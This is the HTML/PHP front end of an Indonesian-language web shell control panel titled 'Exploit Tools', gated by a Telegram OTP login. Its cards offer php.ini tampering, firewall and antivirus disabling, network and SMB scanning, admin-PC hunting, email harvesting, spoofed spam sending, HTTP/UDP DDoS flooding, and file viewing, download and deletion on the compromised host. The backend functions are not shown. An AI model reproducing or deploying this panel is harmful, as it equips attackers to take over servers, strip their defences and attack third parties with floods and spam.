hr{border-color:#00ff9d22;margin:15px 0;}
</style></head>
<body>
<div class="container">
    <h1>🔧 EXPLOIT TOOLS</h1>
    <p style="color:#6c757d;font-size:0.8rem;">Full Version - PHP Mail</p>
    <?php if ($loginError) echo "<div class='error'>$loginError</div>"; ?>
    <?php if ($loginSuccess) echo "<div class='success'>$loginSuccess</div>"; ?>
    <form method="post"><button type="submit" name="request_otp">📨 Kirim OTP ke Telegram</button></form>
    <?php if (isset($_SESSION['otp'])): ?>
    <hr>
    <form method="post"><input type="text" name="otp" placeholder="Kode OTP 6 digit" maxlength="6" required><button type="submit" name="verify_otp">Verifikasi</button></form>
    <?php endif; ?>
    <hr>
    <p style="font-size:0.75rem;"><a href="?action=Dkid" style="color:#ffaa00;">Login Darurat</a></p>
</div>
</body></html>
<?php exit; } ?>

<!-- ==================== PANEL UTAMA ==================== -->
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Exploit Tools Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#0a0f1e;color:#00ff9d;font-family:monospace;padding:20px;}
.container{max-width:900px;margin:0 auto;}
h1{color:#ff0055;text-align:center;border-bottom:2px solid #ff0055;padding-bottom:15px;margin-bottom:20px;}
h1 .sub{font-size:0.8rem;color:#6c757d;}
.card{background:#111;border:1px solid #00ff9d;border-radius:10px;padding:20px;margin-bottom:15px;}
.card h3{color:#00ff9d;margin-bottom:10px;}
.row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px;}
.row .col{flex:1;min-width:150px;}
input,select,textarea{width:100%;padding:8px;margin:5px 0;background:#1e293b;border:1px solid #00ff9d;color:#00ff9d;border-radius:5px;font-family:monospace;}
.btn{display:inline-block;padding:10px 20px;background:transparent;border:2px solid #00ff9d;color:#00ff9d;border-radius:5px;cursor:pointer;text-decoration:none;transition:0.3s;font-weight:bold;font-size:0.85rem;text-align:center;}
.btn:hover{background:#00ff9d;color:#000;}
.btn-danger{border-color:#ff0055;color:#ff0055;}
.btn-danger:hover{background:#ff0055;color:#000;}
.btn-warning{border-color:#ffaa00;color:#ffaa00;}
.btn-warning:hover{background:#ffaa00;color:#000;}
.btn-purple{border-color:#a855f7;color:#a855f7;}
.btn-purple:hover{background:#a855f7;color:#000;}
.btn-green{border-color:#00ff9d;color:#00ff9d;}
.btn-green:hover{background:#00ff9d;color:#000;}
.small-note{color:#6c757d;font-size:0.8rem;margin-top:5px;}
.logout{color:#ff0055;text-decoration:none;float:right;}
pre{background:#0a0f1e;padding:10px;border-radius:5px;font-size:0.8rem;max-height:300px;overflow-y:auto;border:1px solid #00ff9d22;margin-top:10px;}
table{width:100%;font-size:0.75rem;border-collapse:collapse;}
th{text-align:left;padding:5px;border-bottom:1px solid #00ff9d;color:#00ff9d;}
td{padding:5px;border-bottom:1px solid #30363d;}
</style></head>
<body>
<div class="container">
    <h1>🔧 EXPLOIT TOOLS <span class="sub">Full Version</span> <a href="?logout=1" class="logout">Logout</a></h1>

    <!-- Status -->
    <div class="card" style="border-color:#ffaa00;">
        <h3>📋 STATUS</h3>
        <div style="font-size:0.85rem;color:#6c757d;">
            <p><strong>Bot Token:</strong> <?= substr($botToken, 0, 10) ?>...</p>
            <p><strong>Chat ID:</strong> <?= $telegramUserId ?></p>
            <p><strong>Root:</strong> <?= isRoot() ? '✅ Yes' : '❌ No' ?></p>
            <p><strong>Shell:</strong> <?= isShellAvailable() ? '✅ Available' : '❌ Not Available' ?></p>
            <p><strong>Mail:</strong> <?= isMailAvailable() ? '✅ Available' : '❌ Not Available' ?></p>
            <p><strong>Cipher:</strong> <?= $cipher ?></p>
            <p><strong>Server:</strong> <?= $_SERVER['HTTP_HOST'] ?></p>
        </div>
    </div>

    <!-- 1. PHP Settings -->
    <div class="card">
        <h3>⚡ 1. PHP SETTINGS CHANGER</h3>
        <a href="?change_php=1" class="btn btn-purple" onclick="return confirm('Ubah php.ini?')">⚡ CHANGE PHP SETTINGS</a>
        <div class="small-note">Ubah disable_functions, allow_url_fopen, max_execution_time, dll</div>
    </div>

    <!-- 2. Firewall Disabler -->
    <div class="card">
        <h3>🔥 2. FIREWALL DISABLER</h3>
        <a href="?disable_firewall=1" class="btn btn-danger" onclick="return confirm('Matikan firewall?')">🔥 DISABLE FIREWALL</a>
        <div class="small-note">Matikan firewalld, ufw, iptables (Linux) & Windows Firewall</div>
    </div>

    <!-- 3. Antivirus Killer -->
    <div class="card">
        <h3>🛡️ 3. ANTIVIRUS KILLER</h3>
        <a href="?kill_av=1" class="btn btn-danger" onclick="return confirm('Matikan antivirus?')">🔪 KILL ANTIVIRUS</a>
        <div class="small-note">Matikan ClamAV, Sophos, Avast, Kaspersky, ESET, McAfee, dll</div>
    </div>

    <!-- 4. Scan Network -->
    <div class="card">
        <h3>🌐 4. SCAN NETWORK</h3>
        <form method="get" class="row">
            <div class="col"><input type="hidden" name="scan_network" value="1"><input type="text" name="subnet" value="192.168.1.0/24" placeholder="Subnet"></div>
            <button type="submit" class="btn">🔍 SCAN</button>
        </form>
    </div>

    <!-- 5. Find Admin -->
    <div class="card">
        <h3>💻 5. FIND PC ADMIN</h3>
        <form method="get" class="row">
            <div class="col"><input type="hidden" name="find_admin" value="1"><input type="text" name="subnet" value="192.168.1.0/24" placeholder="Subnet"></div>
            <button type="submit" class="btn btn-warning">💻 FIND ADMIN</button>
        </form>
    </div>

    <!-- 6. Scan SMB -->
    <div class="card">
        <h3>📂 6. SCAN SMB SHARES</h3>
        <form method="get" class="row">
            <div class="col"><input type="hidden" name="scan_smb" value="1"><input type="text" name="ip" placeholder="IP Admin" required></div>
            <button type="submit" class="btn">📂 SCAN SMB</button>
        </form>
    </div>

    <!-- 7. Ganti Wallpaper -->
    <div class="card">
        <h3>🖥️ 7. GANTI WALLPAPER PC ADMIN</h3>
        <form method="get" class="row">
            <div class="col"><input type="hidden" name="change_wallpaper" value="1"><input type="text" name="ip" placeholder="IP Admin" required></div>
            <button type="submit" class="btn btn-warning" onclick="return confirm('Ganti wallpaper PC admin?')">🖥️ CHANGE</button>
        </form>
        <div class="small-note">Ganti wallpaper PC admin dengan gambar peringatan</div>
    </div>

    <!-- 8. Email Extractor -->
    <div class="card">
        <h3>📧 8. MASS EMAIL EXTRACTOR</h3>
        <form method="get" class="row">
            <div class="col"><input type="hidden" name="extract_emails" value="1"><input type="text" name="url" placeholder="https://domain.com" required></div>
            <button type="submit" class="btn">📧 EXTRACT</button>
        </form>
    </div>

    <!-- 9. Spam Sender (PHP Mail) -->
    <div class="card">
        <h3>📨 9. SPAM SENDER (PHP MAIL - GRATIS)</h3>
        <form method="get">
            <input type="hidden" name="send_spam_php" value="1">
            <div class="row">
                <div class="col"><input type="text" name="to" placeholder="To (email1,email2)" required></div>
                <div class="col"><input type="text" name="subject" placeholder="Subject" value="System Alert"></div>
            </div>
            <textarea name="msg" rows="3" placeholder="Message" required>Your system has been compromised! Contact admin immediately.</textarea>
            <input type="text" name="from" placeholder="From Email" value="admin@<?= $_SERVER['HTTP_HOST'] ?>">
            <button type="submit" class="btn btn-warning" onclick="return confirm('Kirim spam?')">📨 SEND SPAM (PHP MAIL)</button>
        </form>
        <div class="small-note">✅ Menggunakan mail() bawaan PHP - 100% GRATIS! Test dulu dengan Test Mail.</div>
    </div>

    <!-- 10. Test Mail -->
    <div class="card">
        <h3>📨 10. TEST PHP MAIL</h3>
        <form method="get" class="row">
            <div class="col"><input type="hidden" name="test_php_mail" value="1"><input type="text" name="to" placeholder="Email tujuan" required></div>
            <div class="col"><input type="text" name="from" placeholder="From" value="admin@<?= $_SERVER['HTTP_HOST'] ?>"></div>
            <button type="submit" class="btn btn-green">📨 TEST MAIL</button>
        </form>
        <div class="small-note">Kirim test email ke diri sendiri untuk cek mail() function</div>
    </div>

    <!-- 11. DDoS -->
    <div class="card">
        <h3>🔥 11. DDOS ATTACKER</h3>
        <form method="get" class="row">
            <div class="col"><input type="hidden" name="ddos" value="1"><input type="text" name="target" placeholder="Target (IP/Domain)" required></div>
            <div class="col"><select name="type"><option value="http">HTTP (Layer 7)</option><option value="udp">UDP (Layer 4)</option></select></div>
            <div class="col"><input type="number" name="duration" placeholder="Duration (sec)" value="30"></div>
            <button type="submit" class="btn btn-danger" onclick="return confirm('Mulai DDoS?')">🔥 START</button>
        </form>
        <div class="small-note">⚠️ HTTP flood atau UDP flood ke target</div>
    </div>

    <!-- 12. Scan Webshell -->
    <div class="card">
        <h3>🔍 12. SCAN WEBSHELL / BACKDOOR</h3>
        <form method="get" class="row">
            <div class="col"><input type="hidden" name="scan_webshell" value="1"><input type="text" name="path" placeholder="Path to scan" value="<?= __DIR__ ?>"></div>
            <button type="submit" class="btn btn-danger">🔍 SCAN WEBSHELL</button>
        </form>
        <div class="small-note">Scan file PHP untuk deteksi webshell, backdoor, dan malware</div>
        <?php if (isset($_GET['scan_webshell'])): 
            $result = scan_webshell($_GET['path'] ?? __DIR__);
            if ($result['success'] && !empty($result['files'])): 
        ?>
        <div style="max-height:400px;overflow-y:auto;margin-top:10px;">
            <table>
                <thead><tr><th>File</th><th>Size</th><th>Score</th><th>Actions</th></tr></thead>
                <tbody>
                <?php foreach ($result['files'] as $f): ?>
                    <tr>
                        <td style="word-break:break-all;"><?= basename($f['path']) ?></td>
                        <td><?= $f['size'] ?></td>
                        <td style="color:<?= $f['score'] > 5 ? '#ff0055' : '#ffaa00' ?>;"><?= $f['score'] ?></td>
                        <td>
                            <a href="?view_file=1&file=<?= urlencode($f['path']) ?>" target="_blank" style="color:#00ff9d;">View</a>
                            <a href="?download_file=1&file=<?= urlencode($f['path']) ?>" style="color:#58a6ff;">DL</a>
                            <a href="?delete_file=1&file=<?= urlencode($f['path']) ?>" onclick="return confirm('Hapus?')" style="color:#ff0055;">Del</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <?php endif; endif; ?>
    </div>
</div>
</body></html>
